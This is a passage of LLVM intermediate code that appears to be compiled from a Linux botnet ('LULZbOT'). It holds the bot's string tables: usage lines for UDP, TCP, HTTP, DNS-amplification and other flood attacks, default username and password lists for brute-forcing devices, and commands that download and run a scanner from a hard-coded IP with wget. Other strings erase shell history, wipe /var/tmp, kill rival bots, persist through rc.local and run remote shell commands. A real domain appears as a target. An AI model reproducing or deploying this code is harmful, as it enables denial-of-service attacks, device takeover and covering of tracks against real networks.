i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.386, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.387, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.388, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.389, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.390, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.391, i32 0, i32 0), i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.392, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.393, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.394, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.396, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.397, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.398, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.399, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.400, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.401, i32 0, i32 0)], align 16
@.str.402 = private unnamed_addr constant [20 x i8] c"STD attacking %s:%s\00", align 1
@.str.403 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.404 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.405 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.406 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.407 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.408 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.409 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.410 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.411 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.412 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.413 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.414 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.415 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@__const.sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.415, i32 0, i32 0)], align 16
@.str.416 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\0D\0A\00", align 1
@sleeptime = dso_local global i32 100, align 4
@.str.417 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.418 = private unnamed_addr constant [10 x i8] c"./DNS.txt\00", align 1
@.str.419 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.420 = private unnamed_addr constant [12 x i8] c"irctc.co.in\00", align 1
@pps = dso_local global i32 0, align 4
@limiter = dso_local global i32 0, align 4
@.str.421 = private unnamed_addr constant [10 x i8] c"pkill -9 \00", align 1
@.str.422 = private unnamed_addr constant [20 x i8] c"||busybox pkill -9 \00", align 1
@.str.423 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.424 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@.str.425 = private unnamed_addr constant [21 x i8] c"cd /var/tmp; rm -f *\00", align 1
@.str.426 = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@.str.427 = private unnamed_addr constant [8 x i8] c"http://\00", align 1
@.str.428 = private unnamed_addr constant [132 x i8] c"GET /%s HTTP/1.1\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: */*\0D\0AConnection: Keep-Alive\0D\0A\0D\0A\00", align 1
@.str.429 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.430 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"PYTHON\00", align 1
@.str.432 = private unnamed_addr constant [8 x i8] c"INSTALL\00", align 1
@.str.433 = private unnamed_addr constant [139 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget http://199.38.245.222/good2.py\00", align 1
@.str.434 = private unnamed_addr constant [26 x i8] c"INSTALLING PYTHON SCANNER\00", align 1
@.str.435 = private unnamed_addr constant [5 x i8] c"bins\00", align 1
@.str.436 = private unnamed_addr constant [56 x i8] c"cd /.tmp;rm -rf *py;wget http://199.38.245.222/good2.py\00", align 1
@.str.437 = private unnamed_addr constant [24 x i8] c"UPDATING PYTHON SCANNER\00", align 1
@.str.438 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.439 = private unnamed_addr constant [31 x i8] c"killall -9 python;pkill python\00", align 1
@.str.440 = private unnamed_addr constant [24 x i8] c"STOPPING PYTHON SCANNER\00", align 1
@.str.441 = private unnamed_addr constant [6 x i8] c"START\00", align 1
@.str.442 = private unnamed_addr constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00", align 1
@.str.443 = private unnamed_addr constant [25 x i8] c"STARTING LE HACKA SCANNA\00", align 1
@.str.444 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.445 = private unnamed_addr constant [6 x i8] c"TABLE\00", align 1
@.str.446 = private unnamed_addr constant [23 x i8] c"bins TAKEN SUCCESFULLY\00", align 1
@.str.447 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.448 = private unnamed_addr constant [17 x i8] c"STOPPING SCANNER\00", align 1
@.str.449 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.450 = private unnamed_addr constant [26 x i8] c"STARTING SCANNER ON -> %s\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"BOTKILL\00", align 1
@.str.452 = private unnamed_addr constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00", align 1
@.str.453 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.454 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.455 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.456 = private unnamed_addr constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00", align 1
@.str.457 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.458 = private unnamed_addr constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00", align 1
@.str.459 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.460 = private unnamed_addr constant [50 x i8] c"HTTP <method> <host> <port> <path> <time> <power>\00", align 1
@.str.461 = private unnamed_addr constant [4 x i8] c"DNS\00", align 1
@.str.462 = private unnamed_addr constant [91 x i8] c"DNS <target IP> <port> <reflection file url> <forks> <pps limiter, -1 for no limit> <time>\00", align 1
@.str.463 = private unnamed_addr constant [58 x i8] c"DNS amplification flooding %s:%s for %d seconds at %d pps\00", align 1
@.str.464 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.465 = private unnamed_addr constant [28 x i8] c"HOLD <target> <port> <time>\00", align 1
@.str.466 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.467 = private unnamed_addr constant [24 x i8] c"JUNK <ip> <port> <time>\00", align 1
@.str.468 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.469 = private unnamed_addr constant [27 x i8] c"STD <target> <port> <time>\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.471 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.472 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.473 = private unnamed_addr constant [22 x i8] c"KILLMYEYEPEEUSINGHOIC\00", align 1
@.str.474 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.475 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.476 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.477 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.478 = private unnamed_addr constant [9 x i8] c"LULZbOT\0A\00", align 1
@.str.479 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.480 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.481 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.482 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.483 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.484 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.485 = private unnamed_addr constant [12 x i8] c"BUILD %s:%s\00", align 1
@.str.486 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.487 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.488 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.489 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.490 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.491 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@head = dso_local global %struct.list* null, align 8
@tehport = dso_local global i32 0, align 4
@.str.492 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@UserAgents = dso_local global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.302, i32 0, i32 0)], align 16
@usernames = dso_local global [99 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0)], align 16
@passwords = dso_local global [98 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.234, i32 0, i32 0), 